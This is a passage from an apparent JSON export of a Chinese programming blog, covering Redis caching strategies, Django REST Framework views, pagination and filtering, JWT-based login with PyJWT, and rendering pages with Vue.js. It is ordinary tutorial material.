Through”的方式实现对缓存的更新，这个在下面会介绍到。 缓存相关问题缓存数据的更新在使用缓存时，一个必须搞清楚的问题就是，当数据改变时，如何更新缓存中的数据。通常更新缓存有如下几种套路，分别是： Cache Aside Pattern Read/Write Through Pattern Write Behind Caching Pattern 第1种方式的具体做法就是，当数据更新时，先更新数据库，再删除缓存。注意，不能够使用先更新数据库再更新缓存的方式，也不能够使用先删除缓存再更新数据库的方式，大家可以自己想一想为什么（考虑一下有并发的读操作和写操作的场景）。当然，先更新数据库再删除缓存的做法在理论上也存在风险，但是发生问题的概率是极低的，所以不少的项目都使用了这种方式。 第1种方式相当于编写业务代码的开发者要自己负责对两套存储系统（缓存和关系型数据库）的操作，代码写起来非常的繁琐。第2种方式的主旨是将后端的存储系统变成一套代码，对缓存的维护封装在这套代码中。其中，Read Through指在查询操作中更新缓存，也就是说，当缓存失效的时候，由缓存服务自己负责对数据的加载，从而对应用方是透明的；而Write Through是指在更新数据时，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后再由缓存服务自己更新数据库（同步更新）。刚才我们说过，如果自己对项目中的Redis操作再做一次封装，就可以实现“Read Through”和“Write Through”模式，这样做虽然会增加工作量，但无疑是一件“一劳永逸”且“功在千秋”的事情。 第3种方式是在更新数据的时候，只更新缓存，不更新数据库，而缓存服务这边会异步的批量更新数据库。这种做法会大幅度提升性能，但代价是牺牲数据的强一致性。第3种方式的实现逻辑比较复杂，因为他需要追踪有哪数据是被更新了的，然后再批量的刷新到持久层上。 缓存穿透缓存是为了缓解数据库压力而添加的一个中间层，如果恶意的访问者频繁的访问缓存中没有的数据，那么缓存就失去了存在的意义，瞬间所有请求的压力都落在了数据库上，这样会导致数据库承载着巨大的压力甚至连接异常，类似于分布式拒绝服务攻击（DDoS）的做法。解决缓存穿透的一个办法是约定如果查询返回为空值，把这个空值也缓存起来，但是需要为这个空值的缓存设置一个较短的超时时间，毕竟缓存这样的值就是对缓存空间的浪费。另一个解决缓存穿透的办法是使用布隆过滤器，具体的做法大家可以自行了解。 缓存击穿在实际的项目中，可能存在某个缓存的key某个时间点过期，但恰好在这个时间点对有对该key的大量的并发请求过来，这些请求没有从缓存中找到key对应的数据，就会直接从数据库中获取数据并写回到缓存，这个时候大并发的请求可能会瞬间把数据库压垮，这种现象称为缓存击穿。比较常见的解决缓存击穿的办法是使用互斥锁，简单的说就是在缓存失效的时候，不是立即去数据库加载数据，而是先设置互斥锁（例如：Redis中的setnx），只有设置互斥锁的操作成功的请求，才能执行查询从数据库中加载数据并写入缓存，其他设置互斥锁失败的请求，可以先执行一个短暂的休眠，然后尝试重新从缓存中获取数据，如果缓存还没有数据，则重复刚才的设置互斥锁的操作，大致的参考代码如下所示。 data = redis_cli.get(key) while not data: if redis_cli.setnx('mutex', 'x'): redis.expire('mutex', timeout) data = db.query(...) redis.set(key, data) redis.delete('mutex') else: time.sleep(0.1) data = redis_cli.get(key) 缓存雪崩缓存雪崩是指在将数据放入缓存时采用了相同的过期时间，这样就导致缓存在某一时刻同时失效，请求全部转发到数据库，导致数据库瞬时压力过大而崩溃。解决缓存雪崩问题的方法也比较简单，可以在既定的缓存过期时间上加一个随机时间，这样可以从一定程度上避免不同的key在同一时间集体失效。还有一种办法就是使用多级缓存，每一级缓存的过期时间都不一样，这样的话即便某个级别的缓存集体失效，但是其他级别的缓存还能够提供数据，避免所有的请求都落到数据库上。","categories":[],"tags":[{"name":"使用缓存","slug":"使用缓存","permalink":"http://www.xiaocaibi.top/tags/%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98/"}]},{"title":"50.RESTful架构和DRF进阶","slug":"50-RESTful架构和DRF进阶","date":"2021-06-14T09:50:40.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/b393e57b.html","link":"","permalink":"http://www.xiaocaibi.top/posts/b393e57b.html","excerpt":"","text":"RESTful架构和DRF进阶除了上一节讲到的方法，使用DRF创建REST风格的数据接口也可以通过CBV（基于类的视图）的方式。使用CBV创建数据接口的特点是代码简单，开发效率高，但是没有FBV（基于函数的视图）灵活，因为使用FBV的方式，数据接口对应的视图函数执行什么样的代码以及返回什么的数据是高度可定制的。下面我们以定制学科的数据接口为例，讲解通过CBV方式定制数据接口的具体做法。 使用CBV继承APIView的子类修改之前项目中的polls/views.py，去掉show_subjects视图函数，添加一个名为SubjectView的类，该类继承自ListAPIView，ListAPIView能接收GET请求，它封装了获取数据列表并返回JSON数据的get方法。ListAPIView是APIView 的子类，APIView还有很多的子类，例如CreateAPIView可以支持POST请求，UpdateAPIView可以支持PUT和PATCH请求，DestoryAPIView可以支持DELETE请求。SubjectView 的代码如下所示。 from rest_framework.generics import ListAPIView class SubjectView(ListAPIView): # 通过queryset指定如何获取学科数据 queryset = Subject.objects.all() # 通过serializer_class指定如何序列化学科数据 serializer_class = SubjectSerializer 刚才说过，由于SubjectView的父类ListAPIView已经实现了get方法来处理获取学科列表的GET请求，所以我们只需要声明如何获取学科数据以及如何序列化学科数据，前者用queryset属性指定，后者用serializer_class属性指定。要使用上面的SubjectView，需要修改urls.py文件，如下所示。 urlpatterns = [ path('api/subjects/', SubjectView.as_view()), ] 很显然，上面的做法较之之前讲到的FBV要简单很多。 继承ModelViewSet如果学科对应的数据接口需要支持GET、POST、PUT、PATCH、DELETE请求来支持对学科资源的获取、新增、更新、删除操作，更为简单的做法是继承ModelViewSet来编写学科视图类。再次修改polls/views.py文件，去掉SubjectView类，添加一个名为SubjectViewSet的类，代码如下所示。 from rest_framework.viewsets import ModelViewSet class SubjectViewSet(ModelViewSet): queryset = Subject.objects.all() serializer_class = SubjectSerializer 通过查看ModelViewSet类的源代码可以发现，该类共有6个父类，其中前5个父类分别实现对POST（新增学科）、GET（获取指定学科）、PUT/PATCH（更新学科）、DELETE（删除学科）和GET（获取学科列表）操作的支持，对应的方法分别是create、retrieve、update、destroy和list。由于ModelViewSet的父类中已经实现了这些方法，所以我们几乎没有编写任何代码就完成了学科数据全套接口的开发，我们要做的仅仅是指出如何获取到数据（通过queryset属性指定）以及如何序列化数据（通过serializer_class属性指定），这一点跟上面继承APIView的子类做法是一致的。 class ModelViewSet(mixins.CreateModelMixin, mixins.RetrieveModelMixin, mixins.UpdateModelMixin, mixins.DestroyModelMixin, mixins.ListModelMixin, GenericViewSet): \"\"\" A viewset that provides default `create()`, `retrieve()`, `update()`, `partial_update()`, `destroy()` and `list()` actions. \"\"\" pass 要使用上面的SubjectViewSet，需要在urls.py文件中进行URL映射。由于ModelViewSet相当于是多个视图函数的汇总，所以不同于之前映射URL的方式，我们需要先创建一个路由器并通过它注册SubjectViewSet，然后将注册成功后生成的URL一并添加到urlspattern列表中，代码如下所示。 from rest_framework.routers import DefaultRouter router = DefaultRouter() router.register('api/subjects', SubjectViewSet) urlpatterns += router.urls 除了ModelViewSet类外，DRF还提供了一个名为ReadOnlyModelViewSet 的类，从名字上就可以看出，该类是只读视图的集合，也就意味着，继承该类定制的数据接口只能支持GET请求，也就是获取单个资源和资源列表的请求。 数据分页在使用GET请求获取资源列表时，我们通常不会一次性的加载所有的数据，除非数据量真的很小。大多数获取资源列表的操作都支持数据分页展示，也就说我们可以通过指定页码（或类似于页码的标识）和页面大小（一次加载多少条数据）来获取不同的数据。我们可以通过对QuerySet对象的切片操作来实现分页，也可以利用Django框架封装的Paginator和Page对象来实现分页。使用DRF时，可以在Django配置文件中修改REST_FRAMEWORK并配置默认的分页类和页面大小来实现分页，如下所示。 REST_FRAMEWORK = { 'PAGE_SIZE': 10, 'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination' } 除了上面配置的PageNumberPagination分页器之外，DRF还提供了LimitOffsetPagination和CursorPagination分页器，值得一提的是CursorPagination，它可以避免使用页码分页时暴露网站的数据体量，有兴趣的读者可以自行了解。如果不希望使用配置文件中默认的分页设定，可以在视图类中添加一个pagination_class属性来重新指定分页器，通常可以将该属性指定为自定义的分页器，如下所示。 from rest_framework.pagination import PageNumberPagination class CustomizedPagination(PageNumberPagination): # 默认页面大小 page_size = 5 # 页面大小对应的查询参数 page_size_query_param = 'size' # 页面大小的最大值 max_page_size = 50 class SubjectView(ListAPIView): # 指定如何获取数据 queryset = Subject.objects.all() # 指定如何序列化数据 serializer_class = SubjectSerializer # 指定如何分页 pagination_class = CustomizedPagination 如果不希望数据分页，可以将pagination_class属性设置为None来取消默认的分页器。 数据筛选如果希望使用CBV定制获取老师信息的数据接口，也可以通过继承ListAPIView来实现。但是因为要通过指定的学科来获取对应的老师信息，因此需要对老师数据进行筛选而不是直接获取所有老师的数据。如果想从请求中获取学科编号并通过学科编号对老师进行筛选，可以通过重写get_queryset方法来做到，代码如下所示。 class TeacherView(ListAPIView): serializer_class = TeacherSerializer def get_queryset(self): queryset = Teacher.objects.defer('subject') try: sno = self.request.GET.get('sno', '') queryset = queryset.filter(subject__no=sno) return queryset except ValueError: raise Http404('No teachers found.') 除了上述方式之外，还可以使用三方库django-filter来配合DRF实现对数据的筛选，使用django-filter后，可以通过为视图类配置filter-backends属性并指定使用DjangoFilterBackend来支持数据筛选。在完成上述配置后，可以使用filter_fields 属性或filterset_class属性来指定如何筛选数据，有兴趣的读者可以自行研究。","categories":[],"tags":[{"name":"RESTful架构和DRF进阶","slug":"RESTful架构和DRF进阶","permalink":"http://www.xiaocaibi.top/tags/RESTful%E6%9E%B6%E6%9E%84%E5%92%8CDRF%E8%BF%9B%E9%98%B6/"}]},{"title":"49.RESTful架构和DRF入门","slug":"49-RESTful架构和DRF入门","date":"2021-06-12T03:26:15.000Z","updated":"2021-09-20T08:47:43.932Z","comments":true,"path":"posts/2444c86a.html","link":"","permalink":"http://www.xiaocaibi.top/posts/2444c86a.html","excerpt":"","text":"RESTful架构和DRF入门把软件（Software）、平台（Platform）、基础设施（Infrastructure）做成服务（Service）是很多IT企业都一直在做的事情，这就是大家经常听到的SasS（软件即服务）、PasS（平台即服务）和IasS（基础设置即服务）。实现面向服务的架构（SOA）有诸多的方式，包括RPC（远程过程调用）、Web Service、REST等，在技术层面上，SOA是一种抽象的、松散耦合的粗粒度软件架构；在业务层面上，SOA的核心概念是“重用”和“互操作”，它将系统资源整合成可操作的、标准的服务，使得这些资源能够被重新组合和应用。在实现SOA的诸多方案中，REST被认为是最适合互联网应用的架构，符合REST规范的架构也经常被称作RESTful架构。 REST概述REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的，Roy是HTTP协议（1.0和1.1版）的主要设计者、Apache服务器软件主要作者、Apache基金会第一任主席。在他的博士论文中，Roy把他对互联网软件的架构原则定名为REST，即REpresentational State Transfer的缩写，中文通常翻译为“表现层状态转移”或“表述状态转移”。 这里的“表现层”其实指的是“资源”的“表现层”。所谓资源，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲或一种服务。我们可以用一个URI（统一资源定位符）指向资源，要获取到这个资源，访问它的URI即可，URI就是资源在互联网上的唯一标识。资源可以有多种外在表现形式。我们把资源具体呈现出来的形式，叫做它的“表现层”。比如，文本可以用text/plain格式表现，也可以用text/html格式、text/xml格式、application/json格式表现，甚至可以采用二进制格式；图片可以用image/jpeg格式表现，也可以用image/png格式表现。URI只代表资源的实体，不代表它的表现形式。严格地说，有些网址最后的.html后缀名是不必要的，因为这个后缀名表示格式，属于“表现层”范畴，而URI应该只代表“资源”的位置，它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对“表现层”的描述。 访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。Web应用通常使用HTTP作为其通信协议，客户端想要操作服务器，必须通过HTTP请求，让服务器端发生“状态转移”，而这种转移是建立在表现层之上的，所以就是“表现层状态转移”。客户端通过HTTP的动词GET、POST、PUT（或PATCH）、DELETE，分别对应对资源的四种基本操作，其中GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT（或PATCH）用来更新资源，DELETE用来删除资源。 简单的说RESTful架构就是：“每一个URI代表一种资源，客户端通过四个HTTP动词，对服务器端资源进行操作，实现资源的表现层状态转移”。 我们在设计Web应用时，如果需要向客户端提供资源，就可以使用REST风格的URI，这是实现RESTful架构的第一步。当然，真正的RESTful架构并不只是URI符合REST风格，更为重要的是“无状态”和“幂等性”两个词，我们在后面的课程中会为大家阐述这两点。下面的例子给出了一些符合REST风格的URI，供大家在设计URI时参考。 请求方法（HTTP动词） URI 解释 GET /students/ 获取所有学生 POST /students/ 新建一个学生 GET /students/ID/ 获取指定ID的学生信息 PUT /students/ID/ 更新指定ID的学生信息（提供该学生的全部信息） PATCH /students/ID/ 更新指定ID的学生信息（提供该学生的部分信息） DELETE /students/ID/ 删除指定ID的学生信息 GET /students/ID/friends/ 列出指定ID的学生的所有朋友 DELETE /students/ID/friends/ID/ 删除指定ID的学生的指定ID的朋友 DRF使用入门在Django项目中，如果要实现REST架构，即将网站的资源发布成REST风格的API接口，可以使用著名的三方库djangorestframework ，我们通常将其简称为DRF。 安装和配置DRF安装DRF。 pip install djangorestframework 配置DRF。 INSTALLED_APPS = [ 'rest_framework', ] # 下面的配置根据项目需要进行设置 REST_FRAMEWORK = { # 配置默认页面大小 # 'PAGE_SIZE': 10, # 配置默认的分页类 # 'DEFAULT_PAGINATION_CLASS': '...', # 配置异常处理器 # 'EXCEPTION_HANDLER': '...', # 配置默认解析器 # 'DEFAULT_PARSER_CLASSES': ( # 'rest_framework.parsers.JSONParser', # 'rest_framework.parsers.FormParser', # 'rest_framework.parsers.MultiPartParser', # ), # 配置默认限流类 # 'DEFAULT_THROTTLE_CLASSES': ( # '...' # ), # 配置默认授权类 # 'DEFAULT_PERMISSION_CLASSES': ( # '...', # ), # 配置默认认证类 # 'DEFAULT_AUTHENTICATION_CLASSES': ( # '...', # ), } 编写序列化器前后端分离的开发需要后端为前端、移动端提供API数据接口，而API接口通常情况下都是返回JSON格式的数据，这就需要对模型对象进行序列化处理。DRF中封装了Serializer类和ModelSerializer类用于实现序列化操作，通过继承Serializer类或ModelSerializer类，我们可以自定义序列化器，用于将对象处理成字典，代码如下所示。 from rest_framework import serializers class SubjectSerializer(serializers.ModelSerializer): class Meta: model = Subject fields = '__all__' 上面的代码直接继承了ModelSerializer，通过Meta类的model属性指定要序列化的模型以及fields属性指定需要序列化的模型字段，稍后我们就可以在视图函数中使用该类来实现对Subject模型的序列化。 编写视图函数DRF框架支持两种实现数据接口的方式，一种是FBV（基于函数的视图），另一种是CBV（基于类的视图）。我们先看看FBV的方式如何实现数据接口，代码如下所示。 from rest_framework.decorators import api_view from rest_framework.response import Response @api_view(('GET', )) def show_subjects(request: HttpRequest) -&gt; HttpResponse: subjects = Subject.objects.all().order_by('no') # 创建序列化器对象并指定要序列化的模型 serializer = SubjectSerializer(subjects, many=True) # 通过序列化器的data属性获得模型对应的字典并通过创建Response对象返回JSON格式的数据 return Response(serializer.data) 对比上一个章节的使用bpmapper实现模型序列化的代码，使用DRF的代码更加简单明了，而且DRF本身自带了一套页面，可以方便我们查看我们使用DRF定制的数据接口，如下图所示。 直接使用上一节写好的页面，就可以通过Vue.js把上面接口提供的学科数据渲染并展示出来，此处不再进行赘述。 实现老师信息数据接口编写序列化器。 class SubjectSimpleSerializer(serializers.ModelSerializer): class Meta: model = Subject fields = ('no', 'name') class TeacherSerializer(serializers.ModelSerializer): class Meta: model = Teacher exclude = ('subject', ) 编写视图函数。 @api_view(('GET', )) def show_teachers(request: HttpRequest) -&gt; HttpResponse: try: sno = int(request.GET.get('sno')) subject = Subject.objects.only('name').get(no=sno) teachers = Teacher.objects.filter(subject=subject).defer('subject').order_by('no') subject_seri = SubjectSimpleSerializer(subject) teacher_seri = TeacherSerializer(teachers, many=True) return Response({'subject': subject_seri.data, 'teachers': teacher_seri.data}) except (TypeError, ValueError, Subject.DoesNotExist): return Response(status=404) 配置URL映射。 urlpatterns = [ path('api/teachers/', show_teachers), ] 通过Vue.js渲染页面。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;老师信息&lt;/title&gt; &lt;style&gt; /* 此处省略掉层叠样式表 */ &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h1&gt;{{ subject.name }}学科的老师信息&lt;/h1&gt; &lt;hr&gt; &lt;h2 v-if=\"loaded &amp;&amp; teachers.length == 0\"&gt;暂无该学科老师信息&lt;/h2&gt; &lt;div class=\"teacher\" v-for=\"teacher in teachers\"&gt; &lt;div class=\"photo\"&gt; &lt;img :src=\"'/static/images/' + teacher.photo\" height=\"140\" alt=\"\"&gt; &lt;/div&gt; &lt;div class=\"info\"&gt; &lt;div&gt; &lt;span&gt;&lt;strong&gt;姓名：{{ teacher.name }}&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;性别：{{ teacher.sex | maleOrFemale }}&lt;/span&gt; &lt;span&gt;出生日期：{{ teacher.birth }}&lt;/span&gt; &lt;/div&gt; &lt;div class=\"intro\"&gt;{{ teacher.intro }}&lt;/div&gt; &lt;div class=\"comment\"&gt; &lt;a href=\"\" @click.prevent=\"vote(teacher, true)\"&gt;好评&lt;/a&gt;&amp;nbsp;&amp;nbsp; (&lt;strong&gt;{{ teacher.good_count }}&lt;/strong&gt;) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=\"\" @click.prevent=\"vote(teacher, false)\"&gt;差评&lt;/a&gt;&amp;nbsp;&amp;nbsp; (&lt;strong&gt;{{ teacher.bad_count }}&lt;/strong&gt;) &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;a href=\"/static/html/subjects.html\"&gt;返回首页&lt;/a&gt; &lt;/div&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/vue/2.6.11/vue.min.js\"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: '#container', data: { subject: {}, teachers: [], loaded: false }, created() { fetch('/api/teachers/' + location.search) .then(resp =&gt; resp.json()) .then(json =&gt; { this.subject = json.subject this.teachers = json.teachers }) }, filters: { maleOrFemale(sex) { return sex? '男': '女' } }, methods: { vote(teacher, flag) { let url = flag? '/praise/' : '/criticize/' url += '?tno=' + teacher.no fetch(url).then(resp =&gt; resp.json()).then(json =&gt; { if (json.code === 10000) { if (flag) { teacher.good_count = json.count } else { teacher.bad_count = json.count } } }) } } }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 前后端分离下的用户登录之前我们提到过， HTTP是无状态的，一次请求结束连接断开，下次服务器再收到请求，它就不知道这个请求是哪个用户发过来的。但是对于一个Web应用而言，它是需要有状态管理的，这样才能让服务器知道HTTP请求来自哪个用户，从而判断是否允许该用户请求以及为用户提供更好的服务，这个过程就是常说的会话管理。 之前我们做会话管理（用户跟踪）的方法是：用户登录成功后，在服务器端通过一个session对象保存用户相关数据，然后把session对象的ID写入浏览器的cookie中；下一次请求时，HTTP请求头中携带cookie的数据，服务器从HTTP请求头读取cookie中的sessionid，根据这个标识符找到对应的session对象，这样就能够获取到之前保存在session中的用户数据。我们刚才说过，REST架构是最适合互联网应用的架构，它强调了HTTP的无状态性，这样才能保证应用的水平扩展能力（当并发访问量增加时，可以通过增加新的服务器节点来为系统扩容）。显然，基于session实现用户跟踪的方式需要服务器保存session对象，在做水平扩展增加新的服务器节点时，需要复制和同步session对象，这显然是非常麻烦的。解决这个问题有两种方案，一种是架设缓存服务器（如Redis），让多个服务器节点共享缓存服务并将session对象直接置于缓存服务器中；另一种方式放弃基于session的用户跟踪，使用基于token的用户跟踪。 基于token的用户跟踪是在用户登录成功后，为用户生成身份标识并保存在浏览器本地存储（localStorage、sessionStorage、cookie等）中，这样的话服务器不需要保存用户状态，从而可以很容易的做到水平扩展。基于token的用户跟踪具体流程如下： 用户登录时，如果登录成功就按照某种方式为用户生成一个令牌（token），该令牌中通常包含了用户标识、过期时间等信息而且需要加密并生成指纹（避免伪造或篡改令牌），服务器将令牌返回给前端； 前端获取到服务器返回的token，保存在浏览器本地存储中（可以保存在localStorage或sessionStorage中，对于使用Vue.js的前端项目来说，还可以通过Vuex进行状态管理）； 对于使用了前端路由的项目来说，前端每次路由跳转，可以先判断localStroage中有无token，如果没有则跳转到登录页； 每次请求后端数据接口，在HTTP请求头里携带token；后端接口判断请求头有无token，如果没有token以及token是无效的或过期的，服务器统一返回401； 如果前端收到HTTP响应状态码401，则重定向到登录页面。 通过上面的描述，相信大家已经发现了，基于token的用户跟踪最为关键是在用户登录成功时，要为用户生成一个token作为用户的身份标识。生成token的方法很多，其中一种比较成熟的解决方案是使用JSON Web Token。 JWT概述JSON Web Token通常简称为JWT，它是一种开放标准（RFC 7519）。随着RESTful架构的流行，越来越多的项目使用JWT作为用户身份认证的方式。JWT相当于是三个JSON对象经过编码后，用.分隔并组合到一起，这三个JSON对象分别是头部（header）、载荷（payload）和签名（signature），如下图所示。 头部 { \"alg\": \"HS256\", \"typ\": \"JWT\" } 其中，alg属性表示签名的算法，默认是HMAC SHA256（简写成HS256）；typ属性表示这个令牌的类型，JWT中都统一书写为JWT。 载荷 载荷部分用来存放实际需要传递的数据。JWT官方文档中规定了7个可选的字段： iss ：签发人 exp：过期时间 sub：主题 aud：受众 nbf：生效时间 iat：签发时间 jti：编号 除了官方定义的字典，我们可以根据应用的需要添加自定义的字段，如下所示。 { \"sub\": \"1234567890\", \"nickname\": \"jackfrued\", \"role\": \"admin\" } 签名 签名部分是对前面两部分生成一个指纹，防止数据伪造和篡改。实现签名首先需要指定一个密钥。这个密钥只有服务器才知道，不能泄露给用户。然后，使用头部指定的签名算法（默认是HS256），按照下面的公式产生签名。 HS256(base64Encode(header) + '.' + base64Encode(payload), secret) 算出签名以后，把头部、载荷、签名三个部分拼接成一个字符串，每个部分用.进行分隔，这样一个JWT就生成好了。 JWT的优缺点使用JWT的优点非常明显，包括： 更容易实现水平扩展，因为令牌保存在浏览器中，服务器不需要做状态管理。 更容易防范CSRF攻击，因为在请求头中添加localStorage或sessionStorage中的token必须靠JavaScript代码完成，而不是自动添加到请求头中的。 可以防伪造和篡改，因为JWT有签名，伪造和篡改的令牌无法通过签名验证，会被认定是无效的令牌。 当然，任何技术不可能只有优点没有缺点，JWT也有诸多缺点，大家需要在使用的时候引起注意，具体包括： 可能会遭受到XSS攻击（跨站脚本攻击），通过注入恶意脚本执行JavaScript代码获取到用户令牌。 在令牌过期之前，无法作废已经颁发的令牌，要解决这个问题，还需要额外的中间层和代码来辅助。 JWT是用户的身份令牌，一旦泄露，任何人都可以获得该用户的所有权限。为了降低令牌被盗用后产生的风险，JWT的有效期应该设置得比较短。对于一些比较重要的权限，使用时应通过其他方式再次对用户进行认证，例如短信验证码等。 使用PyJWT在Python代码中，可以使用三方库PyJWT生成和验证JWT，下面是安装PyJWT的命令。 pip install pyjwt 生成令牌。 payload = { 'exp': datetime.datetime.utcnow() + datetime.timedelta(days=1), 'userid': 10001 } token = jwt.encode(payload, settings.SECRET_KEY).decode() 验证令牌。 try: token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTQ4NzIzOTEsInVzZXJpZCI6MTAwMDF9.FM-bNxemWLqQQBIsRVvc4gq71y42I9m2zt5nlFxNHUo' payload = jwt.decode(token, settings.SECRET_KEY) except InvalidTokenError: raise AuthenticationFailed('无效的令牌或令牌已经过期') 如果不清楚JWT具体的使用方式，可以先看看第55天的内容，里面提供了完整的投票项目代码的地址。","categories":[],"tags":[{"name":".RESTful架构","slug":"RESTful架构","permalink":"http://www.xiaocaibi.top/tags/RESTful%E6%9E%B6%E6%9E%84/"}]},{"title":"48.前后端分离开发入门","slug":"48-前后端分离开发入门","date":"2021-06-10T08:11:02.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/2d2323e3.html","link":"","permalink":"http://www.xiaocaibi.top/posts/2d2323e3.html","excerpt":"","text":"前后端分离开发入门在传统的Web应用开发中，大多数的程序员会将浏览器作为前后端的分界线。将浏览器中为用户进行页面展示的部分称之为前端，而将运行在服务器为前端提供业务逻辑和数据准备的所有代码统称为后端。所谓前后端分离的开发，就是前后端工程师约定好数据交互接口，并行的进行开发和测试，后端只提供数据，不负责将数据渲染到页面上，前端通过HTTP请求获取数据并负责将数据渲染到页面上，这个工作是交给浏览器中的JavaScript代码来完成。 使用前后端分离开发有诸多的好处，下面我们简要的说下这些好处： 提升开发效率。前后端分离以后，可以实现前后端代码的解耦，只要前后端沟通约定好应用所需接口以及接口参数，便可以开始并行开发，无需等待对方的开发工作结束。在这种情况下，前后端工程师都可以只专注于自己的开发工作，有助于打造出更好的团队。除此之外，在前后端分离的开发模式下，即使需求发生变更，只要接口与数据格式不变，后端开发人员就不需要修改代码，只要前端进行变动即可。 增强代码的可维护性。前后端分离后，应用的代码不再是前后端混合，只有在运行期才会有调用依赖关系，这样的话维护代码的工作将变得轻松愉快很多，再不会牵一发而动全身。当你的代码变得简明且整洁时，代码的可读性和可维护性都会有质的提升。 支持多终端和服务化架构。前后端分离后，同一套数据接口可以为不同的终端提供服务，更有助于打造多终端应用；此外，由于后端提供的接口之间可以通过HTTP(S)进行调用，有助于打造服务化架构（包括微服务）。 接下来我们就用前后端分离的方式来改写之前的投票应用。 返回JSON格式的数据刚才说过，在前后端分离的开发模式下，后端需要为前端提供数据接口，这些接口通常返回JSON格式的数据。在Django项目中，我们可以先将对象处理成字典，然后就可以利用Django封装的JsonResponse向浏览器返回JSON格式的数据，具体的做法如下所示。 def show_subjects(request): queryset = Subject.objects.all() subjects = [] for subject in queryset: subjects.append({ 'no': subject.no, 'name': subject.name, 'intro': subject.intro, 'isHot': subject.is_hot }) return JsonResponse(subjects, safe=False) 上面的代码中，我们通过循环遍历查询学科得到的QuerySet对象，将每个学科的数据处理成一个字典，在将字典保存在名为subjects的列表容器中，最后利用JsonResponse完成对列表的序列化，向浏览器返回JSON格式的数据。由于JsonResponse序列化的是一个列表而不是字典，所以需要指定safe参数的值为False才能完成对subjects的序列化，否则会产生TypeError异常。 可能大家已经发现了，自己写代码将一个对象转成字典是比较麻烦的，如果对象的属性很多而且某些属性又关联到一个比较复杂的对象时，情况会变得更加糟糕。为此我们可以使用一个名为bpmappers的三方库来简化将对象转成字典的操作，这个三方库本身也提供了对Django框架的支持。 安装三方库bpmappers。 pip install bpmappers 编写映射器（实现对象到字典转换）。 from bpmappers.djangomodel import ModelMapper from poll2.models import Subject class SubjectMapper(ModelMapper): class Meta: model = Subject 修改视图函数。 def show_subjects(request): queryset = Subject.objects.all() subjects = [] for subject in queryset: subjects.append(SubjectMapper(subject).as_dict()) return JsonResponse(subjects, safe=False) 配置URL映射。 urlpatterns = [ path('api/subjects/', show_subjects), ] 然后访问该接口，可以得到如下所示的JSON格式数据。 [ { \"no\": 1, \"name\": \"Python全栈+人工智能\", \"intro\": \"Python是一种计算机程序设计语言。是一种面向对象的动态类型语言，最初被设计用于编写自动化脚本(shell)，随着版本的不断更新和语言新功能的添加，越来越多被用于独立的、大型项目的开发。\", \"is_hot\": true }, // 此处省略下面的内容 ] 如果不希望在JSON数据中显示学科的成立时间，我们可以在映射器中排除create_date属性；如果希望将是否为热门学科对应的键取名为isHot（默认的名字是is_hot），也可以通过修改映射器来做到。具体的做法如下所示： from bpmappers import RawField from bpmappers.djangomodel import ModelMapper from poll2.models import Subject class SubjectMapper(ModelMapper): isHot = RawField('is_hot') class Meta: model = Subject exclude = ('is_hot', ) 再次查看学科接口返回的JSON数据。 [ { \"no\": 101, \"name\": \"Python全栈+人工智能\", \"intro\": \"Python是一种计算机程序设计语言。是一种面向对象的动态类型语言，最初被设计用于编写自动化脚本(shell)，随着版本的不断更新和语言新功能的添加，越来越多被用于独立的、大型项目的开发。\", \"isHot\": true }, // 此处省略下面的内容 ] 关于bpmappers详细的使用指南，请参考它的官方文档，这个官方文档是用日语书写的，可以使用浏览器的翻译功能将它翻译成你熟悉的语言即可。 使用Vue.js渲染页面接下来我们通过前端框架Vue.js来实现页面的渲染。如果希望全面的了解和学习Vue.js，建议阅读它的官方教程或者在YouTube上搜索Vue.js的新手教程（Vue.js Crash Course）进行学习。 重新改写subjects.html页面，使用Vue.js来渲染页面。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;学科信息&lt;/title&gt; &lt;style&gt; /* 此处省略层叠样式表 */ &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h1&gt;扣丁学堂所有学科&lt;/h1&gt; &lt;hr&gt; &lt;div id=\"main\"&gt; &lt;dl v-for=\"subject in subjects\"&gt; &lt;dt&gt; &lt;a :href=\"'/static/html/teachers.html?sno=' + subject.no\"&gt; {{ subject.name }} &lt;/a&gt; &lt;img v-if=\"subject.is_hot\" src=\"/static/images/hot-icon-small.png\"&gt; &lt;/dt&gt; &lt;dd&gt;{{ subject.intro }}&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/vue/2.6.11/vue.min.js\"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: '#main', data: { subjects: [] }, created() { fetch('/api/subjects/') .then(resp =&gt; resp.json()) .then(json =&gt; { this.subjects = json }) } }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 前后端分离的开发需要将前端页面作为静态资源进行部署，项目实际上线的时候，我们会对整个Web应用进行动静分离，静态资源通过Nginx或Apache服务器进行部署，生成动态内容的Python程序部署在uWSGI或者Gunicorn服务器上，对动态内容的请求由Nginx或Apache路由到uWSGI或Gunicorn服务器上。 